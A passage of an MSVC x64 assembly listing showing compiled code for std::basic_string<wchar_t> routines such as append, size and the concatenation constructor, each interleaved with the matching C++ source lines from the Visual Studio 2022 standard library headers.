; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  000ab	48 85 c0	 test	 rax, rax
  000ae	74 52		 je	 SHORT $LN33@Construct

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  000b0	48 83 c0 27	 add	 rax, 39			; 00000027H
  000b4	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  000b8	48 89 48 f8	 mov	 QWORD PTR [rax-8], rcx

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  000bc	eb 0e		 jmp	 SHORT $LN23@Construct
$LN24@Construct:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  000be	48 85 c9	 test	 rcx, rcx
  000c1	74 07		 je	 SHORT $LN25@Construct

; 90   :         return ::operator new(_Bytes);

  000c3	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 248  :         return _Traits::_Allocate(_Bytes);

  000c8	eb 02		 jmp	 SHORT $LN23@Construct
$LN25@Construct:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  000ca	33 c0		 xor	 eax, eax
$LN23@Construct:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000cc	4c 8d 04 7d 02
	00 00 00	 lea	 r8, QWORD PTR [rdi*2+2]

; 2680 : 
; 2681 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2682 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2683 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2684 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2685 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count);
; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();
; 2696 :             return;
; 2697 :         }
; 2698 : 
; 2699 :         size_type _New_capacity = _Calculate_growth(_Count, _Small_string_capacity, max_size());
; 2700 :         const pointer _New_ptr  = _Allocate_for_capacity(_Al, _New_capacity); // throws
; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  000d4	48 89 03	 mov	 QWORD PTR [rbx], rax

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000d7	48 8b d5	 mov	 rdx, rbp

; 2702 : 
; 2703 :         _My_data._Mysize = _Count;

  000da	48 89 7b 10	 mov	 QWORD PTR [rbx+16], rdi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000de	48 8b c8	 mov	 rcx, rax

; 2704 :         _My_data._Myres  = _New_capacity;

  000e1	48 89 73 18	 mov	 QWORD PTR [rbx+24], rsi

; 2717 :     }

  000e5	48 8b 5c 24 58	 mov	 rbx, QWORD PTR [rsp+88]
  000ea	48 83 c4 20	 add	 rsp, 32			; 00000020H
  000ee	5f		 pop	 rdi
  000ef	5e		 pop	 rsi
  000f0	5d		 pop	 rbp

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000f1	e9 00 00 00 00	 jmp	 memcpy
$LN49@Construct:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 144  :         _Throw_bad_array_new_length(); // add overflow

  000f6	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  000fb	cc		 int	 3
$LN60@Construct:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2670 :             _Xlen_string(); // result too long

  000fc	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
  00101	cc		 int	 3
$LN33@Construct:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00102	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00107	cc		 int	 3
$LN58@Construct:
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z PROC ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >, COMDAT

; 1584 :     return __builtin_addressof(_Val);

  00000	48 8b c1	 mov	 rax, rcx

; 1585 : }

  00003	c3		 ret	 0
??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ENDP ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z
_TEXT	SEGMENT
_Obj$ = 8
<_Args_0>$ = 16
??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * &>, COMDAT

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00000	48 8b 02	 mov	 rax, QWORD PTR [rdx]
  00003	48 89 01	 mov	 QWORD PTR [rcx], rax

; 256  :     }
; 257  : }

  00006	c3		 ret	 0
??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$ = 8
?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size, COMDAT

; 4162 :         return _Mypair._Myval2._Mysize;

  00000	48 8b 41 10	 mov	 rax, QWORD PTR [rcx+16]

; 4163 :     }

  00004	c3		 ret	 0
?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z
_TEXT	SEGMENT
this$ = 64
_Right$ = 72
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append, COMDAT

; 3276 :     _CONSTEXPR20 basic_string& append(const basic_string& _Right) {

$LN22:
  00000	40 53		 push	 rbx
  00002	48 83 ec 30	 sub	 rsp, 48			; 00000030H

; 2244 :         return _Myres > _Small_string_capacity;

  00006	48 83 7a 18 07	 cmp	 QWORD PTR [rdx+24], 7

; 3276 :     _CONSTEXPR20 basic_string& append(const basic_string& _Right) {

  0000b	48 8b d9	 mov	 rbx, rcx

; 2235 :         const value_type* _Result = _Bx._Buf;

  0000e	4c 8b ca	 mov	 r9, rdx

; 2236 :         if (_Large_mode_engaged()) {

  00011	76 03		 jbe	 SHORT $LN4@append

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  00013	4c 8b 0a	 mov	 r9, QWORD PTR [rdx]
$LN4@append:

; 3307 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

  00016	4c 8b 43 18	 mov	 r8, QWORD PTR [rbx+24]
  0001a	48 8b 49 10	 mov	 rcx, QWORD PTR [rcx+16]
  0001e	49 8b c0	 mov	 rax, r8

; 3277 :         return append(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00021	48 8b 52 10	 mov	 rdx, QWORD PTR [rdx+16]

; 3307 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

  00025	48 2b c1	 sub	 rax, rcx
  00028	48 3b d0	 cmp	 rdx, rax
  0002b	77 47		 ja	 SHORT $LN9@append
  0002d	48 89 74 24 40	 mov	 QWORD PTR [rsp+64], rsi

; 3308 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + _Count);
; 3309 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  00032	48 8d 34 11	 lea	 rsi, QWORD PTR [rcx+rdx]
  00036	48 89 7c 24 48	 mov	 QWORD PTR [rsp+72], rdi

; 2226 :         value_type* _Result = _Bx._Buf;

  0003b	48 8b fb	 mov	 rdi, rbx

; 3309 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  0003e	48 89 73 10	 mov	 QWORD PTR [rbx+16], rsi

; 2244 :         return _Myres > _Small_string_capacity;

  00042	49 83 f8 07	 cmp	 r8, 7

; 2227 :         if (_Large_mode_engaged()) {

  00046	76 03		 jbe	 SHORT $LN12@append

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  00048	48 8b 3b	 mov	 rdi, QWORD PTR [rbx]
$LN12@append:

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  0004b	4c 8d 04 12	 lea	 r8, QWORD PTR [rdx+rdx]
  0004f	49 8b d1	 mov	 rdx, r9

; 3311 :             _Traits::move(_Old_ptr + _Old_size, _Ptr, _Count);

  00052	48 8d 0c 4f	 lea	 rcx, QWORD PTR [rdi+rcx*2]

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00056	e8 00 00 00 00	 call	 memmove

; 3312 :             _Traits::assign(_Old_ptr[_Old_size + _Count], _Elem());

  0005b	33 c0		 xor	 eax, eax
  0005d	66 89 04 77	 mov	 WORD PTR [rdi+rsi*2], ax

; 3277 :         return append(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00061	48 8b c3	 mov	 rax, rbx
  00064	48 8b 7c 24 48	 mov	 rdi, QWORD PTR [rsp+72]
  00069	48 8b 74 24 40	 mov	 rsi, QWORD PTR [rsp+64]

; 3278 :     }

  0006e	48 83 c4 30	 add	 rsp, 48			; 00000030H
  00072	5b		 pop	 rbx
  00073	c3		 ret	 0
$LN9@append:

; 3316 :         return _Reallocate_grow_by(

  00074	48 8b cb	 mov	 rcx, rbx
  00077	48 89 54 24 20	 mov	 QWORD PTR [rsp+32], rdx
  0007c	e8 00 00 00 00	 call	 ??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>

; 3278 :     }

  00081	48 83 c4 30	 add	 rsp, 48			; 00000030H
  00085	5b		 pop	 rbx
  00086	c3		 ret	 0
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z
_TEXT	SEGMENT
this$ = 96
__formal$dead$ = 104
_Source_of_al$dead$ = 112
_Left_ptr$ = 120
_Left_size$ = 128
_Right_ptr$ = 136
_Right_size$ = 144
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2840 :             _One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Source_of_al._Getal())) {

$LN65:
  00000	48 89 5c 24 10	 mov	 QWORD PTR [rsp+16], rbx
  00005	55		 push	 rbp
  00006	56		 push	 rsi
  00007	57		 push	 rdi
  00008	41 54		 push	 r12
  0000a	41 55		 push	 r13
  0000c	41 56		 push	 r14
  0000e	41 57		 push	 r15
  00010	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  00014	4c 8b b4 24 80
	00 00 00	 mov	 r14, QWORD PTR _Left_size$[rsp]

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  0001c	33 d2		 xor	 edx, edx

; 2841 :         _STL_INTERNAL_CHECK(_Left_size <= max_size());
; 2842 :         _STL_INTERNAL_CHECK(_Right_size <= max_size());
; 2843 :         _STL_INTERNAL_CHECK(_Right_size <= max_size() - _Left_size);
; 2844 :         const auto _New_size    = static_cast<size_type>(_Left_size + _Right_size);

  0001e	4c 8b bc 24 90
	00 00 00	 mov	 r15, QWORD PTR _Right_size$[rsp]
  00026	0f 57 c0	 xorps	 xmm0, xmm0
  00029	4c 8b ac 24 88
	00 00 00	 mov	 r13, QWORD PTR _Right_ptr$[rsp]

; 2845 :         size_type _New_capacity = _Small_string_capacity;

  00031	bb 07 00 00 00	 mov	 ebx, 7

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00036	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2840 :             _One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Source_of_al._Getal())) {

  00039	4d 8b e1	 mov	 r12, r9

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  0003c	48 89 51 10	 mov	 QWORD PTR [rcx+16], rdx

; 2841 :         _STL_INTERNAL_CHECK(_Left_size <= max_size());
; 2842 :         _STL_INTERNAL_CHECK(_Right_size <= max_size());
; 2843 :         _STL_INTERNAL_CHECK(_Right_size <= max_size() - _Left_size);
; 2844 :         const auto _New_size    = static_cast<size_type>(_Left_size + _Right_size);

  00040	4b 8d 2c 3e	 lea	 rbp, QWORD PTR [r14+r15]

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  00044	48 89 51 18	 mov	 QWORD PTR [rcx+24], rdx

; 2840 :             _One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Source_of_al._Getal())) {

  00048	48 8b f1	 mov	 rsi, rcx

; 2846 :         auto& _My_data          = _Mypair._Myval2;
; 2847 :         _Elem* _Ptr             = _My_data._Bx._Buf;

  0004b	48 8b f9	 mov	 rdi, rcx

; 2848 :         auto&& _Alproxy         = _GET_PROXY_ALLOCATOR(_Alty, _Getal());
; 2849 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data); // throws
; 2850 : 
; 2851 :         if (_New_capacity < _New_size) {

  0004e	48 3b eb	 cmp	 rbp, rbx
  00051	0f 86 90 00 00
	00		 jbe	 $LN2@basic_stri

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00057	48 8b c5	 mov	 rax, rbp
  0005a	48 0b c3	 or	 rax, rbx
  0005d	48 bb fe ff ff
	ff ff ff ff 7f	 mov	 rbx, 9223372036854775806 ; 7ffffffffffffffeH
  00067	48 3b c3	 cmp	 rax, rbx

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  0006a	76 10		 jbe	 SHORT $LN11@basic_stri

; 4763 :             return _Max;

  0006c	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  00076	48 8d 0c 00	 lea	 rcx, QWORD PTR [rax+rax]
  0007a	eb 32		 jmp	 SHORT $LN53@basic_stri
$LN11@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  0007c	b9 0a 00 00 00	 mov	 ecx, 10
  00081	48 8b d8	 mov	 rbx, rax
  00084	48 3b c1	 cmp	 rax, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00087	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  00091	48 0f 42 d9	 cmovb	 rbx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2613 :         ++_Capacity; // Take null terminator into consideration

  00095	48 8d 4b 01	 lea	 rcx, QWORD PTR [rbx+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00099	48 3b c8	 cmp	 rcx, rax
  0009c	0f 87 93 00 00
	00		 ja	 $LN54@basic_stri

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  000a2	48 03 c9	 add	 rcx, rcx

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  000a5	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  000ac	72 24		 jb	 SHORT $LN27@basic_stri
$LN53@basic_stri:

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  000ae	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  000b2	48 3b c1	 cmp	 rax, rcx
  000b5	76 7e		 jbe	 SHORT $LN54@basic_stri

; 90   :         return ::operator new(_Bytes);

  000b7	48 8b c8	 mov	 rcx, rax
  000ba	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  000bf	48 85 c0	 test	 rax, rax
  000c2	74 6b		 je	 SHORT $LN36@basic_stri

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  000c4	48 8d 78 27	 lea	 rdi, QWORD PTR [rax+39]
  000c8	48 83 e7 e0	 and	 rdi, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  000cc	48 89 47 f8	 mov	 QWORD PTR [rdi-8], rax

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  000d0	eb 12		 jmp	 SHORT $LN26@basic_stri
$LN27@basic_stri:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  000d2	48 85 c9	 test	 rcx, rcx
  000d5	74 0a		 je	 SHORT $LN28@basic_stri

; 90   :         return ::operator new(_Bytes);

  000d7	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  000dc	48 8b f8	 mov	 rdi, rax

; 248  :         return _Traits::_Allocate(_Bytes);

  000df	eb 03		 jmp	 SHORT $LN26@basic_stri
$LN28@basic_stri:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  000e1	48 8b fa	 mov	 rdi, rdx
$LN26@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2855 :             _Construct_in_place(_My_data._Bx._Ptr, _Fancyptr);

  000e4	48 89 3e	 mov	 QWORD PTR [rsi], rdi
$LN2@basic_stri:

; 2859 :         _My_data._Myres  = _New_capacity;

  000e7	48 89 5e 18	 mov	 QWORD PTR [rsi+24], rbx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000eb	49 8b d4	 mov	 rdx, r12
  000ee	4b 8d 1c 36	 lea	 rbx, QWORD PTR [r14+r14]

; 2856 :         }
; 2857 : 
; 2858 :         _My_data._Mysize = _New_size;

  000f2	48 89 6e 10	 mov	 QWORD PTR [rsi+16], rbp

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000f6	4c 8b c3	 mov	 r8, rbx
  000f9	48 8b cf	 mov	 rcx, rdi
  000fc	e8 00 00 00 00	 call	 memcpy
  00101	4f 8d 04 3f	 lea	 r8, QWORD PTR [r15+r15]
  00105	49 8b d5	 mov	 rdx, r13

; 2860 :         _Traits::copy(_Ptr, _Left_ptr, _Left_size);
; 2861 :         _Traits::copy(_Ptr + static_cast<ptrdiff_t>(_Left_size), _Right_ptr, _Right_size);

  00108	48 8d 0c 3b	 lea	 rcx, QWORD PTR [rbx+rdi]

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  0010c	e8 00 00 00 00	 call	 memcpy

; 2865 :     }

  00111	48 8b 5c 24 68	 mov	 rbx, QWORD PTR [rsp+104]
  00116	33 c0		 xor	 eax, eax
  00118	66 89 04 6f	 mov	 WORD PTR [rdi+rbp*2], ax
  0011c	48 8b c6	 mov	 rax, rsi
  0011f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00123	41 5f		 pop	 r15
  00125	41 5e		 pop	 r14
  00127	41 5d		 pop	 r13
  00129	41 5c		 pop	 r12
  0012b	5f		 pop	 rdi
  0012c	5e		 pop	 rsi
  0012d	5d		 pop	 rbp
  0012e	c3		 ret	 0
$LN36@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0012f	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00134	cc		 int	 3
$LN54@basic_stri:

; 144  :         _Throw_bad_array_new_length(); // add overflow

  00135	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  0013a	cc		 int	 3
$LN62@basic_stri:
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
_TEXT	SEGMENT
this$ = 64
_Ptr$ = 72
_Count$ = 80
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append, COMDAT

; 3304 :         _In_reads_(_Count) const _Elem* const _Ptr, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN14:
  00000	40 53		 push	 rbx
  00002	48 83 ec 30	 sub	 rsp, 48			; 00000030H
  00006	48 8b d9	 mov	 rbx, rcx

; 3305 :         // append [_Ptr, _Ptr + _Count)
; 3306 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

  00009	48 8b 49 10	 mov	 rcx, QWORD PTR [rcx+16]

; 3307 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

  0000d	4c 8b 4b 18	 mov	 r9, QWORD PTR [rbx+24]
  00011	49 8b c1	 mov	 rax, r9
  00014	48 2b c1	 sub	 rax, rcx
  00017	4c 3b c0	 cmp	 r8, rax
  0001a	77 43		 ja	 SHORT $LN2@append
  0001c	48 89 74 24 40	 mov	 QWORD PTR [rsp+64], rsi

; 3308 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + _Count);
; 3309 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  00021	4a 8d 34 01	 lea	 rsi, QWORD PTR [rcx+r8]
  00025	48 89 7c 24 48	 mov	 QWORD PTR [rsp+72], rdi

; 2226 :         value_type* _Result = _Bx._Buf;

  0002a	48 8b fb	 mov	 rdi, rbx

; 3308 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + _Count);
; 3309 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  0002d	48 89 73 10	 mov	 QWORD PTR [rbx+16], rsi

; 2244 :         return _Myres > _Small_string_capacity;

  00031	49 83 f9 07	 cmp	 r9, 7

; 2227 :         if (_Large_mode_engaged()) {

  00035	76 03		 jbe	 SHORT $LN5@append

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  00037	48 8b 3b	 mov	 rdi, QWORD PTR [rbx]
$LN5@append:

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  0003a	4d 03 c0	 add	 r8, r8

; 3310 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();
; 3311 :             _Traits::move(_Old_ptr + _Old_size, _Ptr, _Count);

  0003d	48 8d 0c 4f	 lea	 rcx, QWORD PTR [rdi+rcx*2]

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00041	e8 00 00 00 00	 call	 memmove

; 3312 :             _Traits::assign(_Old_ptr[_Old_size + _Count], _Elem());

  00046	33 c0		 xor	 eax, eax
  00048	66 89 04 77	 mov	 WORD PTR [rdi+rsi*2], ax

; 3313 :             return *this;

  0004c	48 8b c3	 mov	 rax, rbx
  0004f	48 8b 7c 24 48	 mov	 rdi, QWORD PTR [rsp+72]
  00054	48 8b 74 24 40	 mov	 rsi, QWORD PTR [rsp+64]

; 3317 :             _Count,
; 3318 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const _Elem* const _Ptr,
; 3319 :                 const size_type _Count) {
; 3320 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 3321 :                 _Traits::copy(_New_ptr + _Old_size, _Ptr, _Count);
; 3322 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());
; 3323 :             },
; 3324 :             _Ptr, _Count);
; 3325 :     }

  00059	48 83 c4 30	 add	 rsp, 48			; 00000030H
  0005d	5b		 pop	 rbx
  0005e	c3		 ret	 0
$LN2@append:

; 3314 :         }
; 3315 : 
; 3316 :         return _Reallocate_grow_by(

  0005f	4c 8b ca	 mov	 r9, rdx
